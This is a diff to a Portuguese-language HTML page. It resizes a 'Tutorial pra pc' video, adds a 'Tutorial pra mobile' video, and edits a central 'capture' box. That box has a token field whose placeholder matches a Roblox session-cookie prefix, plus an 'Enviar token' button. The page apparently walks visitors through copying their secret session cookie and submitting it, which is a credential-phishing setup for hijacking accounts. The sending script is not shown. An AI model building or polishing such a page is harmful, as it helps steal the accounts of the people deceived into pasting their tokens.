@@ -16,13 +16,12 @@
             position: relative;
             overflow: hidden;
         }
-        /* Vídeo e Texto: Posicionados acima e à esquerda */
+        /* Estilo comum para as seções de vídeo */
         .video-group { 
             position: absolute;
-            left: 20px; 
             top: 10%;  
-            width: 380px;
-            text-align: center; /* Centraliza o texto em relação ao vídeo */
+            width: 320px;
+            text-align: center;
         }
         .video-group iframe {
             border-radius: 8px;
@@ -34,6 +33,12 @@
             color: #ccc;
             font-weight: bold;
         }
+        /* Posicionamento Esquerda (PC) */
+        .left-video { left: 20px; }
+        
+        /* Posicionamento Direita (Mobile) */
+        .right-video { right: 20px; }
+
         /* Container Central de Captura */
         .container { 
             border: 1px solid #333; 
@@ -42,7 +47,7 @@
             background: #252525; 
             text-align: center;
             z-index: 10;
-            width: 400px;
+            width: 380px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.7);
         }
         input { 
@@ -70,8 +75,8 @@
     </style>
 </head>
 <body>
-    <div class="video-group">
-        <iframe width="100%" height="215" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0" allowfullscreen></iframe>
+    <div class="video-group left-video">
+        <iframe width="100%" height="180" src="https://www.youtube.com/embed/FHjCtdGNHCU" frameborder="0" allowfullscreen></iframe>
         <p>Tutorial pra pc</p>
     </div>
 
@@ -81,6 +86,11 @@
         <input type="text" id="userToken" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
         <br>
         <button onclick="enviarToken()">Enviar token</button>
+    </div>
+
+    <div class="video-group right-video">
+        <iframe width="100%" height="180" src="https://www.youtube.com/embed/nwHMDsXw8WE" frameborder="0" allowfullscreen></iframe>
+        <p>Tutorial pra mobile</p>
     </div>
 
     <script>
